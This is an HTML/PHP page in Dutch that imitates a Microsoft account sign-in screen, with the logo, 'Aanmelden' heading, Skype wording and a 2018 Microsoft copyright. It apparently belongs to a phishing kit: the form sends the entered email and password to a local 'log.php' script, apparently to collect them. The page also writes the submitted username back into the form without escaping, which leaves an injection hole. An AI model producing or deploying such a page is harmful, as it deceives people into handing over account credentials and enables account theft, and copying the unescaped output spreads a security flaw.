<html>
<head>
<title>Aanmelden</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="images/hfavicon.ico" rel="shortcut icon">
</head>
<body >
	<div id="container">
		<div class="logo">
			<img src="images/hlogo.png">
			<div class="header-wrapper">
				<h2 class="header-text">Aanmelden</h2>
				<span>Gebruik je Microsoft-account.<br /><a href="#">Wat is dit?</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="E-mailadres, telefoonnummer of Skype-naam" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Wachtwoord" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Aangemeld blijven</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Aanmelden" class="default">
					</div>
					<div class="input-fields forgot">
						<p>Geen account? <a href="#">Maak er een</a>
						<br/><br/>
						<p><a href="#">Ik ben mijn wachtwoord vergeten</a>
						<br/>
						<p class="brand">Microsoft © 2018</p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>